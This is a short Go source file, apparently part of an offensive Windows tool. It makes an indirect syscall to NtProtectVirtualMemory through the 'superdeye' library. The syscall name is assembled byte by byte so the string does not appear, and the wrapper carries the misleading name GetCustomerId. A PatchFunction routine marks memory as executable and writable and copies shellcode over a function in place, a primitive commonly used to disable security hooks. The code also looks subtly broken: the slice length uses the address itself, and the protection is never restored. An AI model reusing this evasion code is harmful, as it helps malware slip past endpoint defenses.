package main

import (
	"unsafe"

	"github.com/almounah/superdeye"
	"golang.org/x/sys/windows"
)

func GetCustomerId(handleProcess windows.Handle, baseAddress uintptr, numberbyteToProtect uintptr, newProtect uint32, oldProtect *uint32) (NTSTATUS uint32, err error) {
	NTSTATUS, err = superdeye.SuperdSyscall(string([]byte{'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i' , 'r' , 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'}),
		uintptr(handleProcess),
		uintptr(unsafe.Pointer(&baseAddress)),
		uintptr(unsafe.Pointer(&numberbyteToProtect)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	return NTSTATUS, err
}

func PatchFunction(address uintptr, pShellcode []byte) error {

	var oldprotect uint32
	_, err := GetCustomerId(windows.Handle(^uintptr(0)), address, uintptr(len(pShellcode)), windows.PAGE_EXECUTE_READWRITE, &oldprotect)
	if err != nil {
		return err
	}

	dst := unsafe.Slice((*byte)(unsafe.Pointer(address)), address)
	copy(dst, pShellcode)

	var newprotect uint32
	_, err = GetCustomerId(windows.Handle(^uintptr(0)), address, uintptr(len(pShellcode)), windows.PAGE_EXECUTE_READWRITE, &newprotect)
	if err != nil {
		return err
	}
	return nil

}
